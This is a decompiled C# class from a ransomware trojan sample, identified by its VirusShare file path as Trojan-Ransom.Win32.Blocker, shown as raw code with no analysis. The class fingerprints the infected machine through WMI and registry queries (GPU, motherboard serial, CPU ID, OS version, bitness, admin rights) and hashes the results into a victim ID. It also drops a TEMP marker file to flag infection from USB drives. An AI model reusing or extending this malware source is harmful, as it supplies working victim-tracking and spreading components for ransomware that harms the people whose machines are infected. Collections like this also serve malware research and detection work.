// Decompiled with JetBrains decompiler
// Type: _2012.x0_inf
// Assembly: 2012, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F5694FB0-D176-4C80-83D0-71B8F6A2BF06
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.cmxi-ac38440cdaaa0a8f08255d957aa7b8a4bfc2438b.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Management;

namespace _2012
{
  internal class x0_inf
  {
    private static string inf_video()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["Description"]);
      return empty;
    }

    private static string inf_mobos()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["SerialNumber"]);
      return empty;
    }

    private static string inf_cpuid()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID = 'CPU0'");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["ProcessorId"]);
      return empty;
    }

    private static string inf_bitve() => Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86") ? "32" : "64";

    private static string inf_wvern()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["Name"]);
      try
      {
        string str = empty.Split('|')[0];
        int length = str.Split(' ')[0].Length;
        return str.Substring(length).TrimStart().TrimEnd();
      }
      catch
      {
        return "Pico";
      }
    }

    private static string inf_adm() => x0_fnc.fnc_admin() ? "A" : "N";

    public static string inf_flags() => File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\xxxUSBxxx.dll") ? "U" : "N";

    public static string inf_SO() => x0_inf.inf_wvern() + " [" + x0_inf.inf_bitve() + "|" + x0_inf.inf_adm() + "]";

    public static string inf_uid() => x0_cry.crymd5((x0_inf.inf_cpuid() + x0_inf.inf_video() + x0_inf.inf_mobos()).ToString());

    public static void usbcheck()
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.DriveType == DriveType.Removable)
          {
            if ((int) drive.RootDirectory.Root.ToString()[0] != (int) Environment.CurrentDirectory[0])
              break;
            File.Create(Environment.GetEnvironmentVariable("TEMP") + "\\xxxUSBxxx.dll");
            break;
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
    }
  }
}
